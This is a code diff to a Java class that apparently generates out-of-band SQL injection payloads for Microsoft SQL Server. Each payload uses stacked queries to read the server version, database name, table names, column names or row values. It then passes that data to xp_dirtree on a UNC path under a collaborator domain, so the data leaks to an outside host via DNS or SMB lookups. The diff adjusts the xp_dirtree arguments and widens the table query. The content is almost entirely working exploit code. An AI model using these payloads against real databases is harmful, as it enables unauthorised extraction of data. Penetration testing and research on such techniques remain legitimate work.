@@ -52,13 +52,13 @@ public class SQLiPayloadManager {
                 if (hexEncoded) {
                     payload = "'; DECLARE @d varchar(62); " +
                              "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(@@VERSION AS VARCHAR)), 2), 1, 62); " +
-                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 } else {
                     payload = "'; DECLARE @s varchar(62); " +
                              "SELECT @s = LEFT(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(" +
                              "LEFT(@@version, CHARINDEX('(X', @@version) + LEN('(X')), " +
                              "CHAR(13), ''), CHAR(10), ''), ' ', ''), ':', ''), '.', ''), '/', ''), '(', ''), ')', ''), 62); " +
-                             "EXEC('master..xp_dirtree \"\\\\' + @s + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master..xp_dirtree \"\\\\' + @s + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 }
                 break;
                 
@@ -66,11 +66,11 @@ public class SQLiPayloadManager {
                 if (hexEncoded) {
                     payload = "'; DECLARE @d varchar(62); " +
                              "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(DB_NAME() AS VARCHAR)), 2), 1, 62); " +
-                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 } else {
                     payload = "'; DECLARE @d varchar(62); " +
                              "SELECT @d = (SELECT CONCAT('', DB_NAME())); " +
-                             "EXEC('master..xp_dirtree \"\\\\'+@d+'." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master..xp_dirtree \"\\\\'+@d+'." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 }
                 break;
                 
@@ -80,16 +80,16 @@ public class SQLiPayloadManager {
                              "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST((" +
                              "SELECT TOP 1 TABLE_NAME FROM (" +
                              "SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RowNum " +
-                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' " +
-                             "AND TABLE_CATALOG = 'master') AS RankedTables WHERE RowNum = 1) AS VARCHAR)), 2), 1, 62); " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE') " +
+                             "AS RankedTables WHERE RowNum = 1) AS VARCHAR)), 2), 1, 62); " +
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 } else {
                     payload = "'; DECLARE @d varchar(62); " +
                              "SELECT @d = (SELECT TOP 1 TABLE_NAME FROM (" +
                              "SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RowNum " +
-                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' " +
-                             "AND TABLE_CATALOG = 'master') AS RankedTables WHERE RowNum = 1); " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE') " +
+                             "AS RankedTables WHERE RowNum = 1); " +
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 }
                 break;
                 
@@ -101,14 +101,14 @@ public class SQLiPayloadManager {
                              "SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                              "WHERE TABLE_NAME = '" + tableNameToUse + "' " +
                              "ORDER BY COLUMN_NAME) AS VARCHAR)), 2), 1, 62); " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 } else {
                     payload = "'; DECLARE @d varchar(62); " +
                              "SELECT @d = (SELECT TOP 1 COLUMN_NAME FROM (" +
                              "SELECT COLUMN_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RowNum " +
                              "FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableNameToUse + "') " +
                              "AS RankedColumns WHERE RowNum = 1); " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 }
                 break;
                 
@@ -120,13 +120,13 @@ public class SQLiPayloadManager {
                              "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(" + columnForRow + " AS VARCHAR)), 2), 1, 62) FROM (" +
                              "SELECT " + columnForRow + ", ROW_NUMBER() OVER (ORDER BY " + columnForRow + ") AS RowNum " +
                              "FROM " + tableForRow + ") AS RankedRows WHERE RowNum = 1; " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 } else {
                     payload = "'; DECLARE @data varchar(62); " +
                              "SELECT @data = (SELECT TOP 1 " + columnForRow + " FROM (" +
                              "SELECT " + columnForRow + ", ROW_NUMBER() OVER (ORDER BY " + columnForRow + ") AS RowNum " +
                              "FROM " + tableForRow + ") AS RankedRows WHERE RowNum = 1); " +
-                             "EXEC('master.sys.xp_dirtree \"\\\\' + @data + '." + collaboratorDomain + "\\x\"'); -- a";
+                             "EXEC('master.sys.xp_dirtree \"\\\\' + @data + '." + collaboratorDomain + "\\x\", 1, 0'); -- a";
                 }
                 break;
                 
